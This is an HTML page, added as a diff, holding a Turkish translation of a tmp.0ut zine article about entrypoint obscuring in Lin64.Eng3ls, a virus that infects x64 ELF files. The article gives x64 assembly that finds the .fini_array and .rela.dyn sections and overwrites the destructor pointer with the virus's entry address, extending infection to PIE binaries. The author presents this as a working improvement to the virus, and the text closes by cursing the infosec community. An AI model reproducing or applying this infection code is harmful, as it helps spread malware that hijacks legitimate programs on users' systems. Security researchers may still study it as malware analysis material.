@@ -1,0 +1,141 @@
+<html>
+<head>
+<title>A short note on entrypoint obscuring in ELF binaries</title>
+<meta charset="utf-8">
+<link href="../style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                ___________                              __
+                \__    ___/____ ______      ____  __ ___/  |_
+                  |    | /     \\____ \    /  _ \|  |  \   __\
+                  |    ||  Y Y  \  |_&gt; &gt;  (  &lt;_&gt; )  |  /|  |
+                  |____||__|_|  /   __/ /\ \____/|____/ |__|
+                              \/|__|    \/
+
++----------------------------------------------------------------------------+
+|::::::::::| A short note on entrypoint obscuring in ELF binaries |::::::::::|
++----------------------------------------------------------------------------+
+
+s01den'den sevgilerle.
+[ M. Akil Gündoğan tarafından çevrilmiştir. ]
+
+--------------------------------------------------------------------------------
+Önceki yayınımızda Sblip ve ben, sizlere x64 ELF dosyalarını enfekte eden virüs-
+ümüz Lin64.Eng3ls'ı sunmuştuk. Bu virüs birtakım havalı anti-RE tekniklerini;
+basit şifreleme, entrypoint gizleme (EPO/entrypoint obscuring) ve bir ptrace
+çağrısı kullanılarak .init_array hijacking yoluyla debugger tespit yöntemlerini
+içeriyordu.
+
+======================== tmp.0ut #1'den kısa bir hatırlatma ========================
+EPO yöntemi uygulanmayan virüslerde, entrypoint virüsün bulaştığı dosyalarda virüsün
+başlangıç noktasıyla değiştirilirken, EPO virüslerinde virüsler daha farklı yollarla
+çağırılabilirler. Bu virüslerde virüse ait kodlar ister başka bir yolla, ister
+burada olduğu gibi gizlenmiş bir jump çağrısı ile çağırılabilirler. Bu teknik
+yürütülebilir dosya formatının kötüye kullanılmasıyla gerçekleştirilir.
+=====================================================================================
+
+Eng3ls'da EPO tekniği, virüsün ilk komutuna işaret etmesi için .fini_array section'ı
+üzerinde (destructor'ı gösteren bir pointer ifade eden) içeren birtakım değişiklikler 
+yapıldı. Ancak virüsü yazdığımız sıralarda bu tekniğin sadece PIE (Position Independent 
+Executable olmayan dosyalar için işe yaradığını düşünüyorduk, haliyle Eng3ls bu nedenle
+çok fazla dosyaya bulaşamıyordu. Tekniğimizin PIE dosyaları için çalışmasını bir türlü
+sağlayamamıştık.
+
+Fakat Tmp.0ut #1'in yayınlanmasından birkaç ay sonra bu sorunu tamamen çözmek amacıyla
+debugger'ı başlattım. Sorun destructor pointer'ının tutulduğu farklı bir yerin olmasıydı:
+.rela.dyn section'undaki bir entrypoint noktası. Bu durumda sadece virüsün ilk komutunun
+adresini patchlememiz aslında yeterliymiş!
+
+--------------------------- KES-BURAYI -----------------------------
+parse_shdr:
+  xor rcx, rcx
+  xor rdx, rdx
+  mov cx, word [rax+e_hdr.shnum]     ;  rcx program header tablosundaki entry sayısını tutar
+  mov rbx, qword [rax+e_hdr.shoff]   ;  rbx program header tablosunun offset'ini tutar 
+  mov dx, word [rax+e_hdr.shentsize] ;  rdx program header tablosundaki entry boyutunu tutar
+
+loop_shdr:
+  add rbx, rdx
+  dec rcx
+  cmp dword [rax+rbx+e_shdr.type], 0x0F ; 0x0F = SHT_FINI_ARRAY, EPO tekniğini uygulamak amacıyla değiştirmek istediğimiz section (.fini_array)
+  je dtor_found
+  cmp rcx, 0
+  jg loop_shdr
+
+dtor_found:
+  mov rdi, qword [rax+rbx+e_shdr.offset]
+  mov r12, qword [rax+rdi]
+
+  xor rcx, rcx
+  xor rdx, rdx
+  mov cx, word [rax+e_hdr.shnum]     ; rcx program header tablosundaki entry sayısını tutar
+  mov rbx, qword [rax+e_hdr.shoff]   ; rbx program header tablosunun offset'ini tutar
+  mov dx, word [rax+e_hdr.shentsize] ; rdx program header tablosundaki entry boyutunu tutar table
+  loop_shdr_2:
+    add rbx, rdx
+    dec rcx
+    cmp dword [rax+rbx+e_shdr.type], 0x04 ; 0x04 = SHT_RELA, EPO tekniğinin çalışması için bu section'a ait entry'i değiştirmemiz gerekiyor.
+    je rela_dyn_found
+    cmp rcx, 0
+    jg loop_shdr_2
+
+  ; ELF'in PIE olup olmamasına göre adres hesaplanır
+  check_pie:
+    pop rdi
+    cmp word [rax+e_hdr.type], 2
+    je check_non_pie
+    cmp qword [rax+rdi], 0x00006000
+    jng continue_infect
+    mov rdi, r8
+    mov rax, 3            ; close sistem çağrısı
+    syscall
+    mov rsp, rbp
+    ret
+
+  check_non_pie:
+    cmp qword [rax+rdi], 0x0c000000
+    jng continue_infect
+    mov rdi, r8
+    mov rax, 3            ; close sistem çağrısı
+    syscall
+    mov rsp, rbp
+    ret
+
+  ; .rela.dyn section'ını bulduğumuzda çağırılacak
+  rela_dyn_found:
+    push rdi
+    mov rdi, qword [rax+rbx+e_shdr.offset]
+    xor rcx, rcx
+    .loop:
+      lea rbx, [rdi+rcx*8]
+      mov r10, qword [rax+rbx] ; r10 section'dan elde ettiğimiz adresi tutar
+      cmp r10, r12 ; r12 .fini_array section'ında tutulan (biz düzenleme yapmadan önceki) adresi tutar 
+      jne .continue ; değiştireceğimiz doğru adresi bulana kadar döngü sağlanır
+      mov qword [rax+rbx], r9 ; doğru adres bulunduğunda virüsün EP (entrypoint) adresi ile değiştirilir
+      mov rcx,0xf
+      .continue:
+      inc rcx
+      cmp rcx, 0x10
+      jne .loop
+    jmp check_pie
+
+  continue_infect:
+  mov [rax+rdi], r9 ; virüsün EP adresini .fini_array section'ına yazdık.
+  ;           ...
+  ; değişiklikleri uygula
+--------------------------------------------------------------------------------
+
+Artık PIE olmuş olmamış fark etmeksizin her x64 ELF dosyasına EPO tekniğini kullanarak
+virüsümüzü bulaştırabiliriz.
+Her ELF dosyası? Hayır aslında tam olarak değil... Bunu bir sonraki sayımızda göreceğiz!
+
+Günün güzel geçsin!
+
+------> Sevgiler:
+Sblip, TMZ, netsp00ky, smelly, tmp.0ut ekibi, Sh4ll, 0kb, Xylit0l ve underground 
+kültürünü yaşatan diğer tüm kimselere!
+Infosec camiası ve bütün kapitalist domuzların canı cehenneme.
+
+
+
